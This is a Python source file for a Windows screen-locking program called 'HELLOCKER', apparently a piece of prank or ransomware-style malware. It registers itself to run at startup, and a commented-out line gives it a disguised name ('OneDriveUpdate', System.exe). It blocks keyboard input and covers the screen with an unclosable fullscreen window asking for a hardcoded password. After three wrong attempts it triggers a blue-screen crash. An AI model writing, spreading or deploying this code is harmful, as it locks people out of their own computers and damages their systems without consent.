#! /usr/bin python
# -*- coding: utf-8 -*-


from tkinter import *
import time
from tkinter import messagebox
from functools import partial
 

from modules import bsod, startup, uninstall

import os

import keyboard
import sys




password = "123"
lock_text = "windows blocked.tobi pizda"
count = 3
#name = "lock.py"


file_path = os.getcwd() + "\\" + os.path.basename(sys.argv[0])
#AddToAutorun("OneDriveUpdate", "C:\\ProgramData\\", "System.exe")
startup(file_path)

def buton(arg):
	enter_pass.insert(END, arg)
def delbuton():
	enter_pass.delete(-1, END)


def tapp(key):
	pass

def check():
	global count
	if enter_pass.get() == password:
		messagebox.showinfo("HELLOCKER","unlocked sucseccfully")

		uninstall(wind)
	else:
		count -= 1
		if count == 0:
			messagebox.showwarning("HELLOCKER","number of attempts expired")
			bsod()
		else:
			
			messagebox.showwarning("HELLOCKER","Wrong password. Avalible tries: "+ str(count))


def exiting():
	messagebox.showwarning("HELLOCKER","YOU CAN NOT EXIT")
wind = Tk()
wind.title("HELLOCKER")
wind["bg"] = "black"
UNTEXD = Label(wind,bg="black", fg="red",text="WINDOWS LOCKED BY HELLOCKER\n\n\n", font="helvetica 75").pack()
untex = Label(wind,bg="black", fg="red",text=lock_text, font="helvetica 40")
untex.pack(side=TOP)

keyboard.on_press(tapp, suppress=True)


enter_pass = Entry(wind,bg="black", fg="red", text="", font="helvetica 35")
enter_pass.pack()
wind.resizable(0,0)


wind.lift()
wind.attributes('-topmost',True)

wind.after_idle(wind.attributes,'-topmost',True)
wind.attributes('-fullscreen', True)
button = Button(wind,text='unlock',padx="31", pady="19",bg='black',fg='red',font="helvetica 30", command=check)
button.pack()
wind.protocol("WM_DELETE_WINDOW", exiting)

button0 = Button(wind,text='0',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "0")).pack(side=LEFT)
button1 = Button(wind,text='1',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "1")).pack(side=LEFT)
button2 = Button(wind,text='2',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "2")).pack(side=LEFT)
button3 = Button(wind,text='3',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "3")).pack(side=LEFT)
button4 = Button(wind,text='4',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "4")).pack(side=LEFT)
button5 = Button(wind,text='5',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "5")).pack(side=LEFT)
button6 = Button(wind,text='6',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "6")).pack(side=LEFT)
button7 = Button(wind,text='7',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "7")).pack(side=LEFT)
button8 = Button(wind,text='8',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "8")).pack(side=LEFT)
button9 = Button(wind,text='9',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "9")).pack(side=LEFT)
delbutton = Button(wind,text='<',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=delbuton).pack(side=LEFT)


wind.mainloop()
